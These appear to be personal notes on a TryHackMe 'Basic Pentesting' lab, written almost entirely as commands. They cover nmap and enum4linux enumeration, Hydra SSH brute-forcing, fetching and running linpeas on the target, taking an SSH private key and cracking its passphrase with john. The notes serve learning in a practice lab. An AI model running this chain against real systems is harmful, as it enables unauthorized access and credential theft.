# TryHackMe practice

## Basic Pentesting

```bash
# in host machine
# port scan
nmap -sC -sV -oN nmap/init {target IP}
# enumerate info
enum4linux -a {target IP} | tee enum4linux.log
# brute-forcing
hydra -l {user name} -P /usr/share/wordlists/rockyou.txt ssh://{target IP}

# Linux Privilege Escalation
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
scp ./linpeas.sh {user name}@{target IP}:/dev/shm
```

```bash
# in target machine
cd /dev/shm/
chmod +x linpeas.sh
./linpeas.sh
# SSH keys were found → copy [kay_id_rsa] content
```

```bash
# in host machine
# crack the password of SSH key
ssh2john kay_id_rsa > forjohn.txt
john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
# now login the target machine with passphrase
ssh -i kay_id_rsa {user name}@{target IP}
```
